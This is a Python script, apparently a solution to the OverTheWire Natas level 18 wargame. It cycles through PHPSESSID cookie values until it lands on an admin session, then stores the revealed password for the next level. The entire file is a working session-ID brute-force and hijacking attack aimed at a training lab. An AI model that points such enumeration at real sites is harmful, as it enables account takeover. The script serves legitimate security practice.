import natas,re,requests,base64

B64 = 'Basic %s' % base64.b64encode('%s:%s' % ('natas18',natas.get_credential('natas18')))
URL = 'http://natas18.natas.labs.overthewire.org/index.php'

def main():

    for i in range(0,641):
        if (i % 20 == 0): 
            print('requesting: %d' % i)
        password = do_request(i)
        if (password is not None):
            print('found password: %s' % password)
            print('adding to credentials....')
            natas.save_credentials('natas19',password)
            print('done')
            break
    
def do_request(phpsessid):
    response = requests.post (
            URL,
            headers=dict(Authorization=B64),
            cookies=dict(PHPSESSID=str(phpsessid)),
            data={
                'username':'admin',
                'password':'admin'
            }
    )
    
    regex=r"Password: (\w+)"
    matches = re.finditer(regex,response.content,re.MULTILINE)

    for match in matches:
        return match.group(1)

    return None

if __name__ == '__main__':
    main()
